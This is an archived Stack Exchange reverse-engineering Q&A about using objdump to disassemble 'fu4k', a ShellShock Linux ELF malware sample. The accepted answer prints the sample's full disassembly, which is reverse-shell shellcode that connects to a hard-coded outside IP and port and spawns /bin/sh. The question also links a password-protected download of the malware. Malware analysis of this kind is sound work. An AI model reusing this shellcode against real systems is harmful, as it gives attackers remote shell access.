{
    "title": "Unable to dump malware assembly using objdump",
    "link": "https://reverseengineering.stackexchange.com/questions/6598/unable-to-dump-malware-assembly-using-objdump",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I'm trying to dump assembly code of a ShellShock malware explained in this blog post:\n </p>\n <ul>\n  <li>\n   <a href=\"http://blog.malwaremustdie.org/2014/09/linux-elf-bash-0day-fun-has-only-just.html?m=1\" rel=\"nofollow\">\n    MMD-0027-2014 - Linux ELF bash 0day (shellshock): The fun has only just begun...\n   </a>\n   .\n  </li>\n </ul>\n <p>\n  After dumping using\n  <code>\n   objdump -d\n  </code>\n  , the output shows just the following:\n </p>\n <pre><code>fu4k:     file format elf32-i386\n</code></pre>\n <p>\n  Then, I tried the command\n  <code>\n   objdump -b elf32-i386 -d fu4k\n  </code>\n  , but it gave the same output.\n </p>\n <p>\n  Please point me in the right direction. Malware is located\n  <a href=\"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3506\" rel=\"nofollow\">\n   here\n  </a>\n  (login required, password:infected).\n </p>\n</div>\n</body></html>",
    "votes": "3",
    "answers": 1,
    "views": "5k",
    "tags": [
        "malware",
        "objdump"
    ],
    "user": "Kumar Vikramjeet",
    "time": "Nov 6, 2014 at 14:47",
    "comments": [],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  <code>\n   -d\n  </code>\n  only disassembles what objdump considers to be code sections. You can use\n  <code>\n   -D\n  </code>\n  to force disassembly of all sections. However, it still doesn't work for this file because it doesn't have a\n  <em>\n   section table\n  </em>\n  :\n </p>\n <pre><code>fu4k:     file format elf32-i386\nfu4k\narchitecture: i386, flags 0x00000102:\nEXEC_P, D_PAGED\nstart address 0x08048054\n\nProgram Header:\n    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12\n         filesz 0x00000098 memsz 0x000000dc flags rwx\n\nSections:\nIdx Name          Size      VMA       LMA       File off  Algn\nSYMBOL TABLE:\nno symbols\n</code></pre>\n <p>\n  So, in this case you can ask objdump to treat the file as binary and disassemble everything:\n </p>\n <pre><code>objdump -b binary -D -m i386 fu4k\n</code></pre>\n <p>\n  To improve disassembly, you can use the information from the\n  <em>\n   program headers\n  </em>\n  (load address and entrypoint address):\n </p>\n <pre><code>>objdump -b binary -D -m i386 fu4k --adjust-vma=0x08048000 --start-address=0x08048054\n\nfu4k:     file format binary\n\n\nDisassembly of section .data:\n\n08048054 <.data+0x54>:\n 8048054:       31 db                   xor    %ebx,%ebx\n 8048056:       f7 e3                   mul    %ebx\n 8048058:       53                      push   %ebx\n 8048059:       43                      inc    %ebx\n 804805a:       53                      push   %ebx\n 804805b:       6a 02                   push   $0x2\n 804805d:       89 e1                   mov    %esp,%ecx\n 804805f:       b0 66                   mov    $0x66,%al\n 8048061:       cd 80                   int    $0x80\n 8048063:       93                      xchg   %eax,%ebx\n 8048064:       59                      pop    %ecx\n 8048065:       b0 3f                   mov    $0x3f,%al\n 8048067:       cd 80                   int    $0x80\n 8048069:       49                      dec    %ecx\n 804806a:       79 f9                   jns    0x8048065\n 804806c:       68 1b 13 9f e0          push   $0xe09f131b\n 8048071:       68 02 00 11 c1          push   $0xc1110002\n 8048076:       89 e1                   mov    %esp,%ecx\n 8048078:       b0 66                   mov    $0x66,%al\n 804807a:       50                      push   %eax\n 804807b:       51                      push   %ecx\n 804807c:       53                      push   %ebx\n 804807d:       b3 03                   mov    $0x3,%bl\n 804807f:       89 e1                   mov    %esp,%ecx\n 8048081:       cd 80                   int    $0x80\n 8048083:       52                      push   %edx\n 8048084:       68 2f 2f 73 68          push   $0x68732f2f\n 8048089:       68 2f 62 69 6e          push   $0x6e69622f\n 804808e:       89 e3                   mov    %esp,%ebx\n 8048090:       52                      push   %edx\n 8048091:       53                      push   %ebx\n 8048092:       89 e1                   mov    %esp,%ecx\n 8048094:       b0 0b                   mov    $0xb,%al\n 8048096:       cd 80                   int    $0x80\n</code></pre>\n</div>\n</body></html>",
            "votes": "5",
            "user": "Igor Skochinsky",
            "time": "Apr 19, 2020 at 17:58",
            "is_accepted": true,
            "comments": []
        }
    ]
}